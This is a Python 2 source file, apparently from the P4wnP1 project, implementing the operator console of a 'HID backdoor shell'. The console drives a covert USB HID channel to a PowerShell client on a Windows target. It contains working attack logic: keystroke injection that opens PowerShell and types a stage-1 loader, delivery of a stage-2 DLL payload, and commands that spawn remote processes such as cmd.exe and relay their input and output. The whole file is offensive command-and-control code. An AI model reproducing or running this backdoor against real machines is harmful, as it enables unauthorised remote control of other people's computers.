#!/usr/bin/python
import time
import cmd
import sys
import Queue
import struct
from pydispatch import dispatcher
from LinkLayer  import LinkLayer
from TransportLayer import TransportLayer
from threading import Thread, Condition, Event
from BlockingQueue import BlockingQueue
from DuckEncoder import DuckEncoder
from Config import Config
from StageHelper import StageHelper
from Channel import Channel
from Client import *

class P4wnP1(cmd.Cmd):
	"""
	Maybe this is the class implementing P4wnP1 HID channel user prompt
	... maybe not, who knows ?!
	"""

	DEBUG=False

	# message types from CLIENT (powershell) to server (python)
	CTRL_MSG_FROM_CLIENT_RESERVED = 0
	CTRL_MSG_FROM_CLIENT_REQ_STAGE2 = 1
	CTRL_MSG_FROM_CLIENT_RCVD_STAGE2 = 2
	CTRL_MSG_FROM_CLIENT_STAGE2_RUNNING = 3
	CTRL_MSG_FROM_CLIENT_RUN_METHOD_RESPONSE = 4 # response from a method ran on client
	CTRL_MSG_FROM_CLIENT_ADD_CHANNEL = 5
	CTRL_MSG_FROM_CLIENT_RUN_METHOD = 6 # client tasks server to run a method
	CTRL_MSG_FROM_CLIENT_DESTROY_RESPONSE = 7 

	# message types from server (python) to client (powershell)
	CTRL_MSG_FROM_SERVER_STAGE2_RESPONSE = 1000
	CTRL_MSG_FROM_SERVER_SEND_OS_INFO = 1001
	CTRL_MSG_FROM_SERVER_SEND_PS_VERSION = 1002
	CTRL_MSG_FROM_SERVER_RUN_METHOD = 1003 # server tasks client to run a method
	CTRL_MSG_FROM_SERVER_ADD_CHANNEL_RESPONSE = 1004
	CTRL_MSG_FROM_SERVER_RUN_METHOD_RESPONSE = 1005 # response from a method ran on server
	CTRL_MSG_FROM_SERVER_DESTROY = 1006 # response from a method ran on server

	def __init__(self, linklayer, transportlayer, stage2 = "", duckencoder = None):
		# state value to inform sub threads of running state
		self.running = False	
		self.stage2=stage2

		self.client = Client() # object to monitor state of remote client

		self.control_sysinfo_response = BlockingQueue("CONTROL_SERVER_SYSINFO_RESPONSE")

		self.server_thread_in = Thread(target = self.__input_handler, name = "P4wnP1 Server Input Loop", args = ( ))
		self.server_thread_out = Thread(target = self.__output_handler, name = "P4wnP1 Server Output Loop", args = ( ))

		self._next_client_method_id = 1

		self.tl = transportlayer
		self.ll = linklayer

		self.__pending_server_methods = {}

		self.duckencoder = duckencoder
		

		# register Listener for LinkLayer signals to upper layers (to receive LinkLayer connection events)
		dispatcher.connect(self.signale_handler_transport_layer, sender="TransportLayerUp")

		cmd.Cmd.__init__(self)
		self.prompt = "P4wnP1 HID shell > "
		self.intro = '''=================================
P4wnP1 HID backdoor shell
Author: MaMe82
Web: https://github.com/mame82/P4wnP1
State: Experimental (maybe forever ;-))

Enter "help" for help
================================='''

	@staticmethod
	def print_debug(str):
		if P4wnP1.DEBUG:
			print "P4wnP1 Server (DEBUG): {}".format(str)

	########################
	# Internal methods of P4wnP1 server
	##########################
	
	def sendControlMessage(self, ctrl_message_type, payload = None):
		ctrl_channel = 0

		# construct header
		ctrl_message = struct.pack("!II", ctrl_channel, ctrl_message_type)

		# append payload
		if payload:
			ctrl_message += payload

		self.tl.write_stream(ctrl_message)
	
	def interactWithClientProcess(self, pid):
		print "Trying to interact with process ID {0} ...".format(pid)
		proc = self.client.getProcess(pid)
		if not proc:
			print "PID {0} not found or process not managed by P4wnP1".format(pid)
			return


		import select
		
		interacting = True
		proc.setInteract(True) # let the process object inform the channel that stdout and stderr should be used
		while interacting:
			if not self.client.isConnected():
				interacting = False
				print "Client disconnected, stop interacting"
				break

			try:
				#input = getpass.getpass()
				# only read key if data available in stdin(avoid blocking stdout)
				if select.select([sys.stdin], [], [], 0.05)[0]: # 50 ms timeout, to keep CPU load low
					input = sys.stdin.readline()
					print input
					proc.writeStdin(input)
			except KeyboardInterrupt:
				interacting = False
				proc.setInteract(False)
				print "Interaction stopped by keyboard interrupt"

	def addChannel(self, payload):
		'''
		Client requested new channel, add it...
		'''
		
		ch_id, ch_type, ch_encoding  = struct.unpack("!IBB", payload)

		P4wnP1.print_debug("Server add channel request. Channel id '{0}', type {1}, encoding {2}".format(ch_id, ch_type, ch_encoding))

	def get_next_method_id(self):
		next = self._next_client_method_id
		# increase next_method id and cap to 0xFFFFFFFF
		self._next_client_method_id = (self._next_client_method_id + 1) & 0xFFFFFFFF
		return next

	def start(self):
		# start LinkLayer Threads
		print "Starting P4wnP1 server..."
		self.ll.start_background()
		
		self.running = True
		self.server_thread_in.start()
		P4wnP1.print_debug("Server input thread started.")
		self.server_thread_out.start()
		P4wnP1.print_debug("Server output thread started.")

	def stop(self):
		self.running = False

	def set_stage2(self, stage2_str):
		self.stage2 = stage2_str

	def __output_handler(self):
		while self.running:
			pending_methods = self.client.getPendingMethods()

			for method_id in pending_methods.keys():
				method = pending_methods[method_id]

				# check if method run has already been requested from client, do it if not
				if not method.run_requested:
					# request method run
					method_request = method.createMethodRequest()
					self.sendControlMessage(P4wnP1.CTRL_MSG_FROM_SERVER_RUN_METHOD, method_request)

					# mark the method with "run requested"
					method.run_requested = True
					continue # step forward to next method

				P4wnP1.print_debug("Pending method name: '{0}', ID: {1}".format(method.name, method.id))

			# process pending output from client channels
			###############################################
			pendingOut = self.client.getPendingChannelOutput()
			if len(pendingOut) > 0:
				# push data to transport layer
				for stream in pendingOut:
					self.tl.write_stream(stream)


			#time.sleep(5)
			time.sleep(0.1)

			

	def __input_handler(self):
		while self.running:
			# processing input data


			indata = False
			bytes_rcvd = 0
			while self.tl.data_available():
				stream = self.tl.pop_input_stream()

				# deconstruct stream into channel and channel payload (network order endianess)
				ch,payload = struct.unpack("!I{0}s".format(len(stream) - 4), stream)

				if (ch == 0):
					# control channel, extract control message type
					msg_type,payload = struct.unpack("!I{0}s".format(len(payload) - 4), payload)
			
					if msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_REQ_STAGE2:
						P4wnP1.print_debug("indata: Control channel, control message STAGE2 REQUEST")
						self.client.setStage2("REQUESTED")
						# we send stage 2
						response = struct.pack("!II{0}s".format(len(self.stage2)), 0, P4wnP1.CTRL_MSG_FROM_SERVER_STAGE2_RESPONSE, self.stage2) # send back stage 2 as string on channel 0 (control channel) ...
						self.tl.write_stream(response) # ... directly to transport layer
					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_RCVD_STAGE2:
						self.client.setStage2("RECEIVED")
					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_STAGE2_RUNNING:
						self.client.setStage2("RUNNING")
					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_RUN_METHOD_RESPONSE:
						# handle method response
						self.client.deliverMethodResponse(payload)
					elif msg_type == P4wnP1.CTRL_MSG_FROM_SERVER_SEND_OS_INFO:
						self.client.setOSInfo(payload)
					elif msg_type == P4wnP1.CTRL_MSG_FROM_SERVER_SEND_PS_VERSION:
						self.client.setPSVersion(payload)
					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_ADD_CHANNEL:
						self.addChannel(payload)
					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_DESTROY_RESPONSE:
						print "Client received kill request and tries to terminate."
					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_RUN_METHOD:
						print "Run method request with following payload received: {0} ".format(repr(payload))

					else:
						P4wnP1.print_debug("indata: Control channel, unknown control message type: {0}, payload: {1} ".format(msg_type, repr(payload)))

				else:
					# as this is not a control channel, it has to be handled by the client object
					#P4wnP1.print_debug("indata: for unknown channel channel {0}, payload: {1} ".format(ch, repr(payload)))
					#P4wnP1.print_debug("indata: for channel channel {0}, payload: {1} ".format(ch, repr(payload)))
					self.client.sendToInputChannel(ch, payload)



	# loose definition, data argument has to be produced by LinkLayer
	def signale_handler_transport_layer(self, signal, data):
		P4wnP1.print_debug("LinkLayer signal: {0}".format(signal))

		if signal == "TransportLayerClientConnectedLinkLayer":
			# connection established
			self.client.setLink(True)
		elif signal == "TransportLayerConnectionResetLinkLayer":
			self.client.setLink(False)
		elif signal == "TransportLayerConnectionTimeoutLinkLayer":
			#self.client.setLink(False)
			pass
		elif signal == "TransportLayerWaitingForClient" or signal == "TransportLayerSendStream":
			# ignore these events
			pass
		else:
			P4wnP1.print_debug("Unhandled LinkLayer signal: {0}".format(signal))

	
		

	# overwrite cmd.emptyline()
	def emptyline(self):
		# do nothing
		pass




	#def handler_client_method_response(self, response):
		## test handler, print response
		#print "Testhandler for client method, result:  " + repr(response)

	def killCLient(self):
		self.sendControlMessage(P4wnP1.CTRL_MSG_FROM_SERVER_DESTROY)
	
	###################
	# caller methods and handlers for remote client methods
	#####################

	# CALLERS
	def client_call_echo(self, echostring):
		self.client.callMethod("core_echo", echostring, self.handler_client_echotest, waitForResult = True)

	def client_call_get_proc_list(self, waitForResult = False):
		self.client.callMethod("core_get_client_proc_list", "", self.handler_client_get_proc_list, waitForResult = waitForResult)
		
	def client_call_create_shell_proc(self, shell="cmd.exe"):
		args=""
		method_args = struct.pack("!B{0}sx{1}sx".format(len(shell), len(args)), 1, shell, args) # create null terminated strings from process name and args
		# we could use the create proc handler
		proc = self.client.callMethod("core_create_proc", method_args, self.handler_client_create_shell_proc, waitForResult = True, deliverResult = True)
		if proc:
			self.interactWithClientProcess(proc.id)

	def client_call_create_proc(self, filename, args, use_channels = True, waitForResult = False):
		# build arguments: [String] ProcFilename + [String] ProcArgs
		use_channels_byte = 0
		if use_channels:
			use_channels_byte = 1
		method_args = struct.pack("!B{0}sx{1}sx".format(len(filename), len(args)), use_channels_byte, filename, args) # create null terminated strings from process name and args

		self.client.callMethod("core_create_proc", method_args, self.handler_client_create_proc, waitForResult = waitForResult)

	def client_call_inform_channel_added(self, channel):
		self.client.callMethod("core_inform_channel_added", struct.pack("!I", channel.id), self.handler_client_inform_channel_added, waitForResult = False)
	# HANDLER
	def handler_client_echotest(self, response):
		print response

	def handler_client_get_proc_list(self, response):
		print response.replace("\r\n", "\n")
		
	def handler_client_create_shell_proc(self, response):
		return self.handler_client_create_proc(response)
		
	def handler_client_create_proc(self, response):
		proc_id, uses_channels, ch_stdin, ch_stdout, ch_stderr = struct.unpack("!IBIII", response)

		uses_channels = bool(uses_channels) # convert bool

		if uses_channels:
			P4wnP1.print_debug("Process created channels, PID: {0}, CH_STDIN: {1}, CH_STDOUT: {2}, CH_STDERR: {3}".format(proc_id, ch_stdin, ch_stdout, ch_stderr))
			
			# we keep track of the process channels in client state, thus we create and add channels

			# create STDIN channel
			ch_stdin = Channel(ch_stdin, Channel.TYPE_OUT, Channel.ENCODING_UTF8) # from our perspective, this is an OUT channel (IN on client)
			# create STDOUT channel
			ch_stdout = Channel(ch_stdout, Channel.TYPE_IN, Channel.ENCODING_UTF8) # from our perspective, this is an IN channel (OUT on client)
			# create STDERR channel
			ch_stderr = Channel(ch_stderr, Channel.TYPE_IN, Channel.ENCODING_UTF8) # from our perspective, this is an IN channel (OUT on client)

			self.client.addChannel(ch_stdin)
			self.client.addChannel(ch_stdout)
			self.client.addChannel(ch_stderr)

			proc = ClientProcess(proc_id, ch_stdin, ch_stdout, ch_stderr)

			self.client.addProc(proc)
			
			
			#self.client.callMethod("core_inform_channel_added", struct.pack("!I", ch_stdin.id), self.handler_core_inform_channel_added, waitForResult = False)
			#self.client.callMethod("core_inform_channel_added", struct.pack("!I", ch_stdout.id), self.handler_core_inform_channel_added, waitForResult = False)
			#self.client.callMethod("core_inform_channel_added", struct.pack("!I", ch_stderr.id), self.handler_core_inform_channel_added, waitForResult = False)
			
			self.client_call_inform_channel_added(ch_stdin)
			self.client_call_inform_channel_added(ch_stderr)
			self.client_call_inform_channel_added(ch_stdout)
		
			print "Process with ID {0} created".format(proc_id)
			return proc
		else:
			print "Process created without channels, PID: {0}".format(proc_id)
		

		
		# retrieve process info

	def handler_client_inform_channel_added(self, response):
		P4wnP1.print_debug("Channel added inform " + repr(response))
	
	###################
	# interface methods callable from P4wnP1 console
	#####################


	def do_KillClient(self, line):
		'''
		Try to kill the process of the remote client
		'''

		if not self.client.isConnected():
			print "This doesn't make sense, there's no client connected"
			return
		
		self.killCLient()

	def do_CreateProc(self, line):
		'''
		This remote Powershell method calls "core_create_proc" in order to create a remote process
		The response is handled by "handler_client_core_create_proc()"
		'''

		if not self.client.isConnected():
			print "Not possible, client not connected"
			return

		if " " in line:
			proc_name, proc_args = line.split(" ",1)
		else:
			proc_name = line
			proc_args = ""

		self.client_call_create_proc(proc_name, proc_args, use_channels = True, waitForResult = False)

	def do_GetClientProcs(self, line):
		'''
		Print a list of processes managed by the remote client
		'''

		if not self.client.isConnected():
			print "Not possible, client not connected"
			return

		self.client_call_get_proc_list(waitForResult = True)

	def do_shell(self, line):
		if not self.client.isConnected():
			print "Not possible, client not connected"
			return
		self.client_call_create_shell_proc()

		
	def do_run_method(self, line):
		if " " in line:
			method_name, method_args = line.split(" ",1)
		else:
			method_name = line
			method_args = ""

		self.client.callMethod(method_name, method_args, self.handler_client_method_response)
		
	def do_SendKeys(self, line):
		'''
		Prints out everything on target through HID keyboard. Be sure to set the correct keyboard language for your target.
		'''
		self.duckencoder.outhidStringDirect(line)
	
	def do_TriggerStage1(self, line):
		'''
		Triggers stage 1 via HID attack. Be sure to have coorect target keyboard language set.
		'''
		#time.sleep(3)
		ps_stub ='''
			GUI r
			DELAY 500
			STRING powershell.exe
			ENTER
			DELAY 1000
		'''
		
		ps_script = StageHelper.out_PS_Stage1_invoker("Stage1.dll")
				
		self.duckencoder.outhidDuckyScript(ps_stub) # print DuckyScript stub
		self.duckencoder.outhidStringDirect(ps_script + "\n") # print stage1 PowerShell script
	
	def do_SetTargetKeyboardLanguage(self, line):
		'''
		Sets the language for target keyboard interaction
		'''
		print self.duckencoder.setLanguage(line.lower())
		
	def do_GetTargetKeyboardLanguage(self, line):
		'''
		Gets the language for target keyboard interaction
		'''
		print self.duckencoder.getLanguage()

	def do_interact(self, line):
		if not self.client.isConnected():
			print "Not possible, client not connected"
			return

		pid = line.split(" ")[0]
		if pid == "":
			print "No process ID given, choose from:"
			procs = self.client.getProcsWithChannel()
			for p in procs:
				print "{0}".format(p.id)
			return

		try:
			pid = int(pid.strip())
		except ValueError:
			print "No valid process id: {0}".format(pid)
			return

		self.interactWithClientProcess(pid)
			
	def do_exit(self, line):
		print "Exitting..."
		# self.ll.stop() # should happen in global finally statement
		sys.exit()

	def do_state(self, line):
		self.client.print_state()
	def do_echotest(self, line):
		'''
		This is a test of calling a remote method on the client and wait for the result to get delivered
		The remote Powershell method itself is "core_echo" which sends back all arguments given.
		The response is handled by "handler_client_echotest()"
		'''
		
		self.client_call_echo(line)


if __name__ == "__main__":
	config = Config.conf_to_dict("config.txt")

	try:
		#dev_file_in_path = "/dev/hidg1"
		#dev_file_out_path = "/dev/hidg1"

		dev_file_in_path = config["HID_RAW_DEV"]
		dev_file_out_path = config["HID_RAW_DEV"]

		
		HIDin_file = open(dev_file_in_path, "rb")
		HIDout_file = open(dev_file_out_path, "wb")

		# the linklayer starts several communication threads
		# for raw HID communication, the threads are started with separate start() method
		ll = LinkLayer(HIDin_file, HIDout_file)
		
		# transport layer automatically registers for linklayer events using pydispatcher
		# in current implementation LinkLayer does nothing but providing an inbound queue
		# Note: As every stream crosses TransportLayer, that would be the place to manipulate
		#	streams if needed (for example encryption)
		tl = TransportLayer()		

		enc = DuckEncoder()
		enc.setKeyDevFile(config["HID_KEYBOARD_DEV"])
		enc.setLanguage(config["KEYBOARD_LANG"])
		
		p4wnp1 = P4wnP1(ll, tl, duckencoder = enc)
		#with open("stage2.ps1", "rb") as f:
		with open("P4wnP1.dll", "rb") as f:
			p4wnp1.set_stage2(f.read())
		p4wnp1.start() # starts link layer (waiting for initial connection) and server input thread
		p4wnp1.cmdloop()

	except:
		#print "Exception: " + str(type(e)) + ":"
		#print "\t{}".format(e.message)
		#exc_type, exc_obj, exc_tb = sys.exc_info()
		#print "\tLine: {}".format(exc_tb.tb_lineno)
		raise
	finally:

		print "Cleaning Up..."
		ll.stop() # send stop event to read and write loop of link layer
		HIDout_file.close()
		HIDin_file.close()
		try:
			p4wnp1.stop()
		except:
			pass
		sys.exit()
